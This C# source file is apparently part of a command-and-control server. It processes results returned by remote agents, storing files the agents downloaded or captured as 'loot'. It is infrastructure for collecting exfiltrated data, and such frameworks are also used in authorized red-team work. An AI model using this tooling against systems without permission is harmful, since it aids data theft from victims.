using System;
using System.Collections.Generic;
using System.Threading.Tasks;
using BinarySerializer;
using Common.APIModels;
using Shared;

namespace TeamServer.FrameHandling;

public class TaskFrameHandler : FrameHandler
{
    public override NetFrameType FrameType { get => NetFrameType.TaskResult; }
    public override async Task ProcessFrame(NetFrame frame, string relay)
    {
        var taskOutput = await this.ExtractFrameData<AgentTaskResult>(frame);

        var task = this.Server.TaskService.Get(taskOutput.Id);
        if(task != null && task.CommandId == CommandId.Download && taskOutput.Objects != null)
        {
            var file = await taskOutput.Objects.BinaryDeserializeAsync<DownloadFile>();
            taskOutput.Objects = null;
            if (taskOutput.Output == null) taskOutput.Output = string.Empty;
            await this.Server.LootService.AddFileAsync(frame.Source, file.FileName, file.Data);
            taskOutput.Output += $"File {file.FileName} available in agent Loots" + Environment.NewLine;

        }

        if (task != null && task.CommandId == CommandId.Capture && taskOutput.Objects != null)
        {
            var files = await taskOutput.Objects.BinaryDeserializeAsync<List<DownloadFile>>();
            taskOutput.Objects = null;
            if (taskOutput.Output == null) taskOutput.Output = string.Empty;
            foreach (var file in files)
            {
                await this.Server.LootService.AddFileAsync(frame.Source, file.FileName, file.Data);
                taskOutput.Output += $"File {file.FileName} available in agent Loots" + Environment.NewLine;
            }
        }

        this.Server.TaskResultService.AddTaskResult(taskOutput);
        this.Server.ChangeTrackingService.TrackChange(ChangingElement.Result, taskOutput.Id);


    }
}